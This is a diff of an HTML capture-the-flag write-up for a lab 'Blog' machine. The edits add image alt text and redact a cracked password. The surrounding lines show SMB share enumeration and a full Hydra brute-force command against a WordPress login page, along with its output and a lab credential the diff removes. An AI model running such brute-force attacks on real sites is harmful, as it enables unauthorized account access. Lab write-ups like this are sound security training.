@@ -2133,7 +2133,7 @@ ff02::2 ip6-allrouters
 &lt;h3 id=&#34;14-smb&#34;&gt;1.4 SMB&lt;/h3&gt;
 &lt;p&gt;Let&amp;rsquo;s explore the SMB port that was open.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
-└─$ smbclient -L 10.10.129.188 -N                                           130 ⨯
+└─$ smbclient -L 10.10.129.188 -N
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -2161,7 +2161,7 @@ smb: \&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I have a feeling its a rickroll. Also, taylor swift uh huh. Plus, the author of the room mentioned to not go down &amp;ldquo;the rabbit hole&amp;rdquo;.&lt;/p&gt;
 &lt;p&gt;Went to the qrcode link. Here&amp;rsquo;s not a rickroll XD&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=eFTLKWw542g&#34;&gt;https://www.youtube.com/watch?v=eFTLKWw542g&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Ql3cqlS.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/Ql3cqlS.png&#34; alt=&#34;image of the rabbithole images&#34;  /&gt;&lt;/p&gt;
 &lt;p&gt;Clearly the rabbit hole.&lt;/p&gt;
 &lt;h3 id=&#34;15-bruteforce-passwords&#34;&gt;1.5 Bruteforce passwords&lt;/h3&gt;
 &lt;p&gt;I cant seem to find any creds lying around. So we&amp;rsquo;ll try getting into &lt;code&gt;bjoel&lt;/code&gt; and &lt;code&gt;kwheel&lt;/code&gt;&amp;rsquo;s accounts by bruteforcing with Hydra.&lt;/p&gt;
@@ -2182,7 +2182,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-08 06:33:
 [DATA] attacking http-post-form://blog.thm:80/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In&amp;amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&amp;amp;testcookie=1:F=password
 [STATUS] 847.00 tries/min, 847 tries in 00:01h, 14343552 to do in 282:15h, 16 active
 [STATUS] 845.00 tries/min, 2535 tries in 00:03h, 14341864 to do in 282:53h, 16 active
-[80][http-post-form] host: blog.thm   login: kwheel   password: cutiepie1
+[80][http-post-form] host: blog.thm   login: kwheel   password: {hidden}
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-08 06:37:11
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
